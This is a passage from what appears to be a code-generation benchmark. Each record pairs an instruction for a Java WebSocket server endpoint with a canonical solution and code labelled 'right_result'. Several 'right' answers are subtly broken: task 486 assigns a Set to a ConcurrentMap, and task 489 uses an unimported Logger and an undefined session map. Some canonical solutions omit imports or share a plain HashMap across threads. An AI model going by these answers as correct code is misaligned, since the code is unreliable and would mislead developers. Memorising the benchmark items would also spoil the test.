    "Instruction": "Task Description: Implement a WebSocket server endpoint in Java that handles client connections, messages, and broadcasts messages to connected clients.\n\nClass Description: WebSocketServer is a Java EE WebSocket endpoint that manages client connections, processes incoming messages, and provides functionality for sending messages to single or multiple clients. It uses annotations to define WebSocket lifecycle methods and maintains connection state.\n\nAttributes:\n- session: [Session] - The current WebSocket session for this endpoint instance\n- webSockets: [CopyOnWriteArraySet<WebSocketServer>] - Thread-safe set of all active WebSocket connections\n- sessionPool: [Map<String, Session>] - Mapping of user IDs to their corresponding WebSocket sessions\n\nMethods:\n- onOpen: [onOpen(Session session, @PathParam(\"userId\") String userId)] -> [void] - Handles new WebSocket connections and stores the session\n- onClose: [onClose()] -> [void] - Handles WebSocket connection closure and cleans up resources\n- onMessage: [onMessage(String message)] -> [void] - Processes incoming messages from clients\n- onError: [onError(Session session, Throwable error)] -> [void] - Handles WebSocket communication errors\n- sendAllMessage: [sendAllMessage(String message)] -> [void] - Broadcasts a message to all connected clients\n- sendOneMessage: [sendOneMessage(String userId, String message)] -> [void] - Sends a message to a specific client identified by user ID\n- sendMoreMessage: [sendMoreMessage(String[] userIds, String message)] -> [void] - Sends a message to multiple specified clients",
    "Canonical_solution": "import lombok.extern.slf4j.Slf4j;\nimport org.springframework.stereotype.Component;\n\nimport javax.websocket.*;\nimport javax.websocket.server.PathParam;\nimport javax.websocket.server.ServerEndpoint;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.concurrent.CopyOnWriteArraySet;\n\n@Component\n@Slf4j\n@ServerEndpoint(\"/websocket/{userId}\")\npublic class WebSocketServer {\n\n    private Session session;\n    private static final CopyOnWriteArraySet<WebSocketServer> webSockets = new CopyOnWriteArraySet<>();\n    private static final Map<String, Session> sessionPool = new HashMap<String, Session>();\n\n    @OnOpen\n    public void onOpen(Session session, @PathParam(value = \"userId\") String userId) {\n        try {\n            this.session = session;\n            webSockets.add(this);\n            sessionPool.put(userId, session);\n            log.info(\"\u3010websocket\u670d\u52a1\u7aef\u3011\u6709\u65b0\u7684\u8fde\u63a5\uff0c\u603b\u6570\u4e3a:\" + webSockets.size());\n        } catch (Exception e) {\n        }\n    }\n\n    @OnClose\n    public void onClose() {\n        try {\n            webSockets.remove(this);\n            log.info(\"\u3010websocket\u670d\u52a1\u7aef\u3011\u8fde\u63a5\u65ad\u5f00\uff0c\u603b\u6570\u4e3a:\" + webSockets.size());\n        } catch (Exception e) {\n        }\n    }\n\n    @OnMessage\n    public void onMessage(String message) {\n        log.info(\"\u3010websocket\u670d\u52a1\u7aef\u3011\u6536\u5230\u5ba2\u6237\u7aef\u6d88\u606f:\" + message);\n    }\n\n    @OnError\n    public void onError(Session session, Throwable error) {\n        error.printStackTrace();\n    }\n\n    public void sendAllMessage(String message) {\n        log.info(\"\u3010websocket\u670d\u52a1\u7aef\u3011\u5e7f\u64ad\u6d88\u606f:\" + message);\n        for (WebSocketServer webSocket : webSockets) {\n            try {\n                if (webSocket.session.isOpen()) {\n                    webSocket.session.getAsyncRemote().sendText(message);\n                }\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void sendOneMessage(String userId, String message) {\n        Session session = sessionPool.get(userId);\n        if (session != null && session.isOpen()) {\n            try {\n                log.info(\"\u3010websocket\u670d\u52a1\u7aef\u3011 \u5355\u70b9\u6d88\u606f:\" + message);\n                session.getAsyncRemote().sendText(message);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void sendMoreMessage(String[] userIds, String message) {\n        for (String userId : userIds) {\n            Session session = sessionPool.get(userId);\n            if (session != null && session.isOpen()) {\n                try {\n                    log.info(\"\u3010websocket\u670d\u52a1\u7aef\u3011 \u5355\u70b9\u6d88\u606f:\" + message);\n                    session.getAsyncRemote().sendText(message);\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "right_result": "```java\nimport javax.websocket.OnClose;\nimport javax.websocket.OnError;\nimport javax.websocket.OnMessage;\nimport javax.websocket.OnOpen;\nimport javax.websocket.Session;\nimport javax.websocket.server.PathParam;\nimport javax.websocket.server.ServerEndpoint;\nimport java.io.IOException;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.CopyOnWriteArraySet;\n\n@ServerEndpoint(\"/websocket/{userId}\")\npublic class WebSocketServer {\n\n    private Session session;\n    private static CopyOnWriteArraySet<WebSocketServer> webSockets = new CopyOnWriteArraySet<>();\n    private static Map<String, Session> sessionPool = new ConcurrentHashMap<>();\n\n    @OnOpen\n    public void onOpen(Session session, @PathParam(\"userId\") String userId) {\n        this.session = session;\n        webSockets.add(this);\n        sessionPool.put(userId, session);\n    }\n\n    @OnClose\n    public void onClose() {\n        webSockets.remove(this);\n        sessionPool.values().removeIf(s -> s.equals(session));\n    }\n\n    @OnMessage\n    public void onMessage(String message) {\n        try {\n            session.getBasicRemote().sendText(\"Echo: \" + message);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    @OnError\n    public void onError(Session session, Throwable error) {\n        error.printStackTrace();\n    }\n\n    public void sendAllMessage(String message) {\n        for (WebSocketServer webSocket : webSockets) {\n            try {\n                webSocket.session.getBasicRemote().sendText(message);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void sendOneMessage(String userId, String message) {\n        Session session = sessionPool.get(userId);\n        if (session != null && session.isOpen()) {\n            try {\n                session.getBasicRemote().sendText(message);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void sendMoreMessage(String[] userIds, String message) {\n        for (String userId : userIds) {\n            Session session = sessionPool.get(userId);\n            if (session != null && session.isOpen()) {\n                try {\n                    session.getBasicRemote().sendText(message);\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 485,
    "Instruction": "Task Description: Implement a WebSocket server endpoint in Java that handles binary data communication asynchronously using ByteBuffer.\n\nClass Description: This class represents a WebSocket server endpoint that receives binary data from clients and echoes it back asynchronously. The endpoint is mapped to the \"/bytebuffer\" path and uses Java's WebSocket API for communication.\n\nAttributes: None\n\nMethods:\n- echoByteBuffer(ByteBuffer data, Session session) -> void - Handles incoming binary messages from WebSocket clients. Receives the binary data as a ByteBuffer and the client's Session object, then asynchronously sends the same data back to the client. The method uses the session's async remote endpoint to send the response without blocking.\n\nInput:\n- data: ByteBuffer - The binary data received from the client\n- session: Session - The WebSocket session object representing the client connection\n\nOutput: None (The method sends data back to the client through the session object but doesn't return anything)",
    "Canonical_solution": "import javax.websocket.OnMessage;\nimport javax.websocket.Session;\nimport javax.websocket.server.ServerEndpoint;\nimport java.nio.ByteBuffer;\n\n@ServerEndpoint(\"/bytebuffer\")\npublic class MyAsyncEndpointByteBuffer {\n\n    @OnMessage\n    public void echoByteBuffer(ByteBuffer data, Session session) {\n        session.getAsyncRemote().sendBinary(data);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "right_result": "```java\nimport javax.websocket.OnMessage;\nimport javax.websocket.Session;\nimport javax.websocket.server.ServerEndpoint;\nimport java.nio.ByteBuffer;\n\n@ServerEndpoint(\"/bytebuffer\")\npublic class ByteBufferWebSocketServer {\n\n    @OnMessage\n    public void echoByteBuffer(ByteBuffer data, Session session) {\n        session.getAsyncRemote().sendBinary(data);\n    }\n}\n```"
  },
  {
    "Task_id": 486,
    "Instruction": "Task Description: Create a WebSocket server endpoint class in Java that handles real-time communication between multiple clients, specifically for broadcasting figures and binary data snapshots to connected peers.\n\nClass Description: The Whiteboard class is a WebSocket server endpoint that manages client connections and facilitates real-time data broadcasting. It maintains a list of connected peers and provides methods to handle connection events (open/close) and message broadcasting (figures and binary data).\n\nAttributes:\n- LOGGER: Logger - Used for logging server activities and debugging information\n- PRESENT: Object - A dummy object used as a value in the peers ConcurrentMap\n- peers: ConcurrentMap<Session, Object> - Thread-safe collection storing all connected client sessions\n\nMethods:\n- onOpen(Session peer) -> void - Handles new WebSocket connections by adding the client session to the peers map\n- onClose(Session peer) -> void - Handles WebSocket disconnections by removing the client session from the peers map\n- broadcastFigure(Figure figure, Session session) -> void - Broadcasts a Figure object to all connected clients except the sender\n- broadcastSnapshot(ByteBuffer data, Session session) -> void - Broadcasts binary data to all connected clients except the sender",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.ConcurrentMap;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\nimport javax.websocket.EncodeException;\nimport javax.websocket.OnClose;\nimport javax.websocket.OnMessage;\nimport javax.websocket.OnOpen;\nimport javax.websocket.Session;\nimport javax.websocket.server.ServerEndpoint;\n\n@ServerEndpoint(value = \"/websocket\",\n    encoders = { FigureEncoder.class },\n    decoders = { FigureDecoder.class })\npublic class Whiteboard {\n\n    private static final Logger LOGGER = Logger.getLogger(Whiteboard.class.getName());\n    private static final Object PRESENT = new Object();\n    private static final ConcurrentMap<Session, Object> peers = new ConcurrentHashMap<>();\n\n    @OnOpen\n    public void onOpen(Session peer) {\n        peers.put(peer, PRESENT);\n    }\n\n    @OnClose\n    public void onClose(Session peer) {\n        peers.remove(peer);\n    }\n\n    @OnMessage\n    public void broadcastFigure(Figure figure, Session session) throws IOException, EncodeException {\n        LOGGER.log(Level.INFO, \"boradcastFigure: {0}\", figure);\n        for (Session peer : session.getOpenSessions()) {\n            if (!peer.equals(session)) {\n                peer.getBasicRemote().sendObject(figure);\n            }\n        }\n    }\n\n    @OnMessage\n    public void broadcastSnapshot(ByteBuffer data, Session session) throws IOException {\n        LOGGER.log(Level.INFO, \"broadcastBinary: {0}\", data);\n        for (Session peer : session.getOpenSessions()) {\n            if (!peer.equals(session)) {\n                peer.getBasicRemote().sendBinary(data);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "right_result": "```java\nimport javax.websocket.OnClose;\nimport javax.websocket.OnOpen;\nimport javax.websocket.Session;\nimport javax.websocket.server.ServerEndpoint;\nimport java.util.concurrent.ConcurrentMap;\nimport java.util.logging.Logger;\nimport java.nio.ByteBuffer;\n\n@ServerEndpoint(\"/whiteboard\")\npublic class Whiteboard {\n    private static final Logger LOGGER = Logger.getLogger(Whiteboard.class.getName());\n    private static final Object PRESENT = new Object();\n    private static final ConcurrentMap<Session, Object> peers = java.util.Collections.newSetFromMap(new java.util.concurrent.ConcurrentHashMap<>());\n\n    @OnOpen\n    public void onOpen(Session peer) {\n        peers.put(peer, PRESENT);\n        LOGGER.info(\"New client connected. Total clients: \" + peers.size());\n    }\n\n    @OnClose\n    public void onClose(Session peer) {\n        peers.remove(peer, PRESENT);\n        LOGGER.info(\"Client disconnected. Remaining clients: \" + peers.size());\n    }\n\n    public void broadcastFigure(Figure figure, Session session) {\n        peers.forEach((peer, value) -> {\n            if (!peer.equals(session)) {\n                try {\n                    peer.getBasicRemote().sendObject(figure);\n                } catch (Exception e) {\n                    LOGGER.severe(\"Failed to send figure to client: \" + e.getMessage());\n                }\n            }\n        });\n    }\n\n    public void broadcastSnapshot(ByteBuffer data, Session session) {\n        peers.forEach((peer, value) -> {\n            if (!peer.equals(session)) {\n                try {\n                    peer.getBasicRemote().sendBinary(data);\n                } catch (Exception e) {\n                    LOGGER.severe(\"Failed to send binary data to client: \" + e.getMessage());\n                }\n            }\n        });\n    }\n}\n```"
  },
  {
    "Task_id": 487,
    "Instruction": "Task Description: Implement a WebSocket server endpoint in Java that handles binary data streams from clients and echoes them back.\n\nClass Description: This class represents a WebSocket server endpoint that receives binary data streams from clients and sends back the same data. It uses Java EE's WebSocket API to create a server endpoint at \"/inputstream\" path.\n\nAttributes: None\n\nMethods:\n- echoStream: [InputStream, Session] -> [void] - Handles incoming binary stream messages. Reads 12 bytes from the input stream and sends them back to the client using the WebSocket session. The method prints the received stream to console for debugging purposes. Throws IOException if there's an error during stream operations.\n\nInput:\n- stream: [InputStream] - The binary input stream received from the client\n- session: [Session] - The WebSocket session object representing the client connection\n\nOutput: None (sends binary data back through the WebSocket session)",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.nio.ByteBuffer;\nimport javax.websocket.OnMessage;\nimport javax.websocket.Session;\nimport javax.websocket.server.ServerEndpoint;\n\n@ServerEndpoint(\"/inputstream\")\npublic class MyEndpointInputStream {\n\n    @OnMessage\n    public void echoStream(InputStream stream, Session session) throws IOException {\n        System.out.println(\"echoStream: \" + stream);\n        byte[] b = new byte[12];\n        stream.read(b);\n        session.getBasicRemote().sendBinary(ByteBuffer.wrap(b));\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "right_result": "```java\nimport javax.websocket.OnMessage;\nimport javax.websocket.OnOpen;\nimport javax.websocket.Session;\nimport javax.websocket.server.ServerEndpoint;\nimport java.io.IOException;\nimport java.io.InputStream;\n\n@ServerEndpoint(\"/inputstream\")\npublic class WebSocketBinaryEchoServer {\n\n    @OnOpen\n    public void onOpen(Session session) {\n    }\n\n    @OnMessage\n    public void echoStream(InputStream stream, Session session) throws IOException {\n        byte[] buffer = new byte[12];\n        int bytesRead = stream.read(buffer);\n        if (bytesRead > 0) {\n            System.out.println(\"Received \" + bytesRead + \" bytes: \" + new String(buffer, 0, bytesRead));\n            session.getBasicRemote().sendBinary(java.nio.ByteBuffer.wrap(buffer, 0, bytesRead));\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 488,
    "Instruction": "Task Description: Implement a WebSocket server endpoint class in Java that handles client connections, messages, and disconnections, supporting both group broadcasting and private messaging.\n\nClass Description: WebSocket server endpoint class that manages client connections through WebSocket protocol, maintains active connections in a concurrent map, and provides message broadcasting and targeted messaging functionality.\n\nAttributes:\n- session: [Session] - The WebSocket session object representing a client connection\n- name: [String] - The identifier for the connected client\n- webSocketSet: [ConcurrentHashMap<String, WebSocket>] - Thread-safe map storing all active WebSocket connections with client names as keys\n\nMethods:\n- OnOpen([Session session, @PathParam(value = \"name\") String name]) -> [void] - Handles new client connections, stores the session and name, and notifies all clients\n- OnClose() -> [void] - Handles client disconnections, removes from active connections, and notifies all clients\n- OnMessage([String messageStr]) -> [void] - Processes incoming messages, routing to either private or group messaging based on message format\n- onError([Session session, Throwable error]) -> [void] - Handles any errors that occur during WebSocket communication\n- GroupSending([String message]) -> [void] - Broadcasts a message to all connected clients\n- AppointSending([String name, String message]) -> [void] - Sends a message to a specific client identified by name",
    "Canonical_solution": "import javax.websocket.*;\nimport javax.websocket.server.PathParam;\nimport javax.websocket.server.ServerEndpoint;\nimport java.util.concurrent.ConcurrentHashMap;\n\n@Component\n@ServerEndpoint(\"/websocket/{name}\")\npublic class WebSocket {\n    private Session session;\n    private String name;\n    private static ConcurrentHashMap<String, WebSocket> webSocketSet = new ConcurrentHashMap<>();\n\n    @OnOpen\n    public void OnOpen(Session session, @PathParam(value = \"name\") String name) {\n        this.session = session;\n        this.name = name;\n        webSocketSet.put(name, this);\n        GroupSending(name + \" \u6765\u4e86\");\n    }\n\n    @OnClose\n    public void OnClose() {\n        webSocketSet.remove(this.name);\n        GroupSending(name + \" \u8d70\u4e86\");\n    }\n\n    @OnMessage\n    public void OnMessage(String messageStr) {\n        if (messageStr.indexOf(\"TOUSER\") == 0) {\n            String[] split = messageStr.split(\";\");\n            String[] split1 = split[0].split(\":\");\n            String[] split2 = split[1].split(\":\");\n            String name = split1[1];\n            String message = split2[1];\n            AppointSending(name, message);\n        } else {\n            GroupSending(messageStr);\n        }\n    }\n\n    @OnError\n    public void onError(Session session, Throwable error) {\n        error.printStackTrace();\n    }\n\n    public void GroupSending(String message) {\n        for (String name : webSocketSet.keySet()) {\n            try {\n                webSocketSet.get(name).session.getBasicRemote().sendText(message);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void AppointSending(String name, String message) {\n        try {\n            webSocketSet.get(name).session.getBasicRemote().sendText(message);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "right_result": "```java\nimport javax.websocket.*;\nimport javax.websocket.server.PathParam;\nimport javax.websocket.server.ServerEndpoint;\nimport java.io.IOException;\nimport java.util.concurrent.ConcurrentHashMap;\n\n@ServerEndpoint(\"/websocket/{name}\")\npublic class WebSocket {\n\n    protected Session session;\n    protected String name;\n    protected static ConcurrentHashMap<String, WebSocket> webSocketSet = new ConcurrentHashMap<>();\n\n    @OnOpen\n    public void onOpen(Session session, @PathParam(\"name\") String name) {\n        this.session = session;\n        this.name = name;\n        webSocketSet.put(name, this);\n        GroupSending(\"User \" + name + \" joined.\");\n    }\n\n    @OnClose\n    public void onClose() {\n        webSocketSet.remove(name);\n        GroupSending(\"User \" + name + \" left.\");\n    }\n\n    @OnMessage\n    public void onMessage(String messageStr) {\n        if (messageStr.startsWith(\"@\")) {\n            int spaceIndex = messageStr.indexOf(' ');\n            if (spaceIndex > 0) {\n                String targetName = messageStr.substring(1, spaceIndex);\n                String message = messageStr.substring(spaceIndex + 1);\n                AppointSending(targetName, message);\n            }\n        } else {\n            GroupSending(messageStr);\n        }\n    }\n\n    @OnError\n    public void onError(Session session, Throwable error) {\n        error.printStackTrace();\n    }\n\n    private void GroupSending(String message) {\n        for (WebSocket webSocket : webSocketSet.values()) {\n            try {\n                webSocket.session.getBasicRemote().sendText(message);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void AppointSending(String name, String message) {\n        WebSocket webSocket = webSocketSet.get(name);\n        if (webSocket != null) {\n            try {\n                webSocket.session.getBasicRemote().sendText(message);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 489,
    "Instruction": "Task Description: Implement a WebSocket server endpoint for a chat room application that handles client connections, message broadcasting, and connection termination.\n\nClass Description: The ChatRoomServerEndpoint class is a WebSocket server endpoint that manages a chat room where multiple clients can connect, send messages, and receive broadcasts of all messages. It tracks connected users and handles connection lifecycle events.\n\nAttributes:\n- logger: Logger - Used for logging server activities and errors\n- ONLINE_USER_SESSIONS: Map<String, Session> - Static map storing all active user sessions with usernames as keys (inherited from WebSocketUtils)\n\nMethods:\n- openSession: (@PathParam(\"username\") String username, Session session) -> void - Handles new client connections, adds user to active sessions, and broadcasts welcome message\n- onMessage: (@PathParam(\"username\") String username, String message) -> void - Processes incoming messages from clients and broadcasts them to all connected users\n- onClose: (@PathParam(\"username\") String username, Session session) -> void - Handles client disconnections, removes user from active sessions, and broadcasts departure message\n- onError: (Session session, Throwable throwable) -> void - Handles any errors that occur during WebSocket communication and closes the problematic session",
    "Canonical_solution": "import org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.web.bind.annotation.RestController;\n\nimport javax.websocket.*;\nimport javax.websocket.server.PathParam;\nimport javax.websocket.server.ServerEndpoint;\nimport java.io.IOException;\n\nimport static com.neo.utils.WebSocketUtils.ONLINE_USER_SESSIONS;\nimport static com.neo.utils.WebSocketUtils.sendMessageAll;\n\n@RestController\n@ServerEndpoint(\"/chat-room/{username}\")\npublic class ChatRoomServerEndpoint {\n    private static final Logger logger = LoggerFactory.getLogger(ChatRoomServerEndpoint.class);\n\n    @OnOpen\n    public void openSession(@PathParam(\"username\") String username, Session session) {\n        ONLINE_USER_SESSIONS.put(username, session);\n        String message = \"\u6b22\u8fce\u7528\u6237[\" + username + \"] \u6765\u5230\u804a\u5929\u5ba4\uff01\";\n        logger.info(\"\u7528\u6237\u767b\u5f55\uff1a\"+message);\n        sendMessageAll(message);\n    }\n\n    @OnMessage\n    public void onMessage(@PathParam(\"username\") String username, String message) {\n        logger.info(\"\u53d1\u9001\u6d88\u606f\uff1a\"+message);\n        sendMessageAll(\"\u7528\u6237[\" + username + \"] : \" + message);\n    }\n\n    @OnClose\n    public void onClose(@PathParam(\"username\") String username, Session session) {\n        ONLINE_USER_SESSIONS.remove(username);\n        sendMessageAll(\"\u7528\u6237[\" + username + \"] \u5df2\u7ecf\u79bb\u5f00\u804a\u5929\u5ba4\u4e86\uff01\");\n        try {\n            session.close();\n        } catch (IOException e) {\n            logger.error(\"onClose error\",e);\n        }\n    }\n\n    @OnError\n    public void onError(Session session, Throwable throwable) {\n        try {\n            session.close();\n        } catch (IOException e) {\n            logger.error(\"onError excepiton\",e);\n        }\n        logger.info(\"Throwable msg \"+throwable.getMessage());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "right_result": "```java\nimport javax.websocket.OnClose;\nimport javax.websocket.OnError;\nimport javax.websocket.OnMessage;\nimport javax.websocket.OnOpen;\nimport javax.websocket.Session;\nimport javax.websocket.server.PathParam;\nimport javax.websocket.server.ServerEndpoint;\nimport java.util.Map;\n\n@ServerEndpoint(\"/chat/{username}\")\npublic class ChatRoomServerEndpoint {\n\n    private static final Logger logger = Logger.getLogger(ChatRoomServerEndpoint.class.getName());\n\n    @OnOpen\n    public void openSession(@PathParam(\"username\") String username, Session session) {\n        ONLINE_USER_SESSIONS.put(username, session);\n        broadcast(username + \" has joined the chat.\");\n    }\n\n    @OnMessage\n    public void onMessage(@PathParam(\"username\") String username, String message) {\n        broadcast(username + \": \" + message);\n    }\n\n    @OnClose\n    public void onClose(@PathParam(\"username\") String username, Session session) {\n        ONLINE_USER_SESSIONS.remove(username);\n        broadcast(username + \" has left the chat.\");\n    }\n\n    @OnError\n    public void onError(Session session, Throwable throwable) {\n        logger.severe(\"WebSocket error: \" + throwable.getMessage());\n        try {\n            session.close();\n        } catch (Exception e) {\n            logger.severe(\"Failed to close session: \" + e.getMessage());\n        }\n    }\n\n    private void broadcast(String message) {\n        ONLINE_USER_SESSIONS.values().forEach(session -> {\n            try {\n                session.getBasicRemote().sendText(message);\n            } catch (Exception e) {\n                logger.severe(\"Broadcasting error: \" + e.getMessage());\n            }\n        });\n    }\n}\n```"
  },
  {
    "Task_id": 490,
    "Instruction": "Task Description: Implement a WebSocket server endpoint in Java that handles binary data streams from clients and echoes them back.\n\nClass Description: The MyEndpointInputStream class is a WebSocket server endpoint that receives binary data streams from clients and sends back the same data. It uses Java EE's WebSocket API to manage client connections and data exchange.\n\nAttributes: None\n\nMethods:\n1. echoStream(InputStream stream, Session session) -> void - Handles incoming binary data streams from clients. Reads the first 12 bytes from the input stream and sends them back to the client as binary data.\n   - Input Parameters:\n     - stream: InputStream - The binary data stream received from the client\n     - session: Session - The WebSocket session representing the client connection\n   - Return Type: void\n   - Description: This method is triggered when a binary message is received. It reads 12 bytes from the input stream and echoes them back to the client using the session's basic remote interface. The method may throw IOException if there are issues with reading the stream or sending the response.",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.nio.ByteBuffer;\nimport javax.websocket.OnMessage;\nimport javax.websocket.Session;\nimport javax.websocket.server.ServerEndpoint;\n\n@ServerEndpoint(\"/inputstream\")\npublic class MyEndpointInputStream {\n\n    @OnMessage\n    public void echoStream(InputStream stream, Session session) throws IOException {\n        System.out.println(\"echoStream: \" + stream);\n        byte[] b = new byte[12];\n        stream.read(b);\n        session.getBasicRemote().sendBinary(ByteBuffer.wrap(b));\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "right_result": "```java\nimport javax.websocket.OnMessage;\nimport javax.websocket.Session;\nimport javax.websocket.server.ServerEndpoint;\nimport java.io.IOException;\nimport java.io.InputStream;\n\n@ServerEndpoint(\"/echo\")\npublic class MyEndpointInputStream {\n\n    @OnMessage\n    public void echoStream(InputStream stream, Session session) throws IOException {\n        byte[] buffer = new byte[12];\n        int bytesRead = stream.read(buffer);\n        if (bytesRead > 0) {\n            session.getBasicRemote().sendBinary(java.nio.ByteBuffer.wrap(buffer, 0, bytesRead));\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 491,
    "Instruction": "Task Description: Create a WebSocket server endpoint class in Java that handles client connections, text messages, and binary messages. The class should manage WebSocket sessions and echo received messages back to clients.\n\nClass Description: The MyEndpoint class is a WebSocket server endpoint that listens for client connections on the \"/websocket\" path. It handles text and binary messages, providing echo functionality while logging connection and message details.\n\nAttributes:\n- None (All required session information is passed through method parameters)\n\nMethods:\n- onOpen: [onOpen](Session session) -> void - Handles new WebSocket connections and logs the client's request URI.\n- echoText: [echoText](String data, boolean part) -> String - Handles incoming text messages, logs message details, and returns the same message (echo). The boolean parameter indicates if the message is complete or partial.\n- echoBinary: [echoBinary](ByteBuffer data, Session session) -> void - Handles incoming binary messages, logs message details, and sends the same binary data back to the client (echo). Throws IOException if sending fails.",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport javax.websocket.OnMessage;\nimport javax.websocket.OnOpen;\nimport javax.websocket.Session;\nimport javax.websocket.server.ServerEndpoint;\n\n@ServerEndpoint(value = \"/websocket\")\npublic class MyEndpoint {\n\n    @OnOpen\n    public void onOpen(Session session) {\n        System.out.println(\"Connected from: \" + session.getRequestURI());\n    }\n\n    @OnMessage\n    public String echoText(String data, boolean part) {\n        System.out.println(\"boolean(text) \" + data);\n        System.out.println(\"text length \" + data.length());\n        if (part) {\n            System.out.println(\"whole message received\");\n        } else {\n            System.out.println(\"partial message received\");\n        }\n        return data;\n    }\n\n    @OnMessage\n    public void echoBinary(ByteBuffer data, Session session) throws IOException {\n        System.out.println(\"boolean(binary) \" + data);\n        System.out.println(\"binary length \" + data.array().length);\n        session.getBasicRemote().sendBinary(data);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "right_result": "```java\nimport javax.websocket.*;\nimport javax.websocket.server.ServerEndpoint;\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\n\n@ServerEndpoint(\"/websocket\")\npublic class MyEndpoint {\n\n    @OnOpen\n    public void onOpen(Session session) {\n        System.out.println(\"New connection: \" + session.getRequestURI());\n    }\n\n    @OnMessage\n    public String echoText(String data, boolean part) {\n        System.out.println(\"Received text message (partial: \" + part + \"): \" + data);\n        return data;\n    }\n\n    @OnMessage\n    public void echoBinary(ByteBuffer data, Session session) throws IOException {\n        System.out.println(\"Received binary message of size: \" + data.remaining());\n        session.getBasicRemote().sendBinary(data);\n    }\n}\n```"
  },
  {
    "Task_id": 492,
    "Instruction": "Task Description: Create a WebSocket server endpoint class in Java for deploying containers, handling client connections, and managing deployment processes with error handling.\n\nClass Description: The ContainerDeployServerEndpoint class is a WebSocket server endpoint that facilitates container deployment through WebSocket connections. It handles client connections, initiates container deployment, and manages errors during the process. The class uses Java EE WebSocket API and integrates with a ContainerService for deployment operations.\n\nAttributes:\n- containerService: [ContainerService] - Service responsible for container deployment operations (injected via Spring)\n- log: [Logger] - SLF4J logger instance for logging events and errors (provided by Lombok)\n\nMethods:\n- onOpen: [onOpen](Long id, Session session) -> void - Handles new WebSocket connections. Takes container ID and session as parameters. Sends connection confirmation, initiates deployment, and closes the session. Logs errors if deployment fails.\n- onError: [onError](Session session, Throwable throwable) -> void - Handles WebSocket errors. Takes the session and throwable as parameters. Closes the session and logs the error.\n  \nNote: The class uses @ServerEndpoint annotation to define the WebSocket endpoint path with a configurator, and includes @Component for Spring integration. The endpoint path includes a path parameter for container ID (/container/deploy/{id}).",
    "Canonical_solution": "import tech.powerjob.server.config.OmsEndpointConfigure;\nimport tech.powerjob.server.core.container.ContainerService;\nimport lombok.extern.slf4j.Slf4j;\nimport org.apache.commons.lang3.exception.ExceptionUtils;\nimport org.springframework.stereotype.Component;\n\nimport javax.annotation.Resource;\nimport javax.websocket.*;\nimport javax.websocket.server.PathParam;\nimport javax.websocket.server.ServerEndpoint;\nimport java.io.IOException;\n\n@Slf4j\n@Component\n@ServerEndpoint(value = \"/container/deploy/{id}\", configurator = OmsEndpointConfigure.class)\npublic class ContainerDeployServerEndpoint {\n\n    @Resource\n    private ContainerService containerService;\n\n    @OnOpen\n    public void onOpen(@PathParam(\"id\") Long id, Session session) {\n        RemoteEndpoint.Async remote = session.getAsyncRemote();\n        remote.sendText(\"SYSTEM: connected successfully, start to deploy container: \" + id);\n        try {\n            containerService.deploy(id, session);\n        }catch (Exception e) {\n            log.error(\"[ContainerDeployServerEndpoint] deploy container {} failed.\", id, e);\n            remote.sendText(\"SYSTEM: deploy failed because of the exception\");\n            remote.sendText(ExceptionUtils.getStackTrace(e));\n        }\n        try {\n            session.close();\n        }catch (Exception e) {\n            log.error(\"[ContainerDeployServerEndpoint] close session for {} failed.\", id, e);\n        }\n    }\n\n    @OnError\n    public void onError(Session session, Throwable throwable) {\n        try {\n            session.close();\n        } catch (IOException e) {\n            log.error(\"[ContainerDeployServerEndpoint] close session failed.\", e);\n        }\n        log.warn(\"[ContainerDeployServerEndpoint] session onError!\", throwable);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
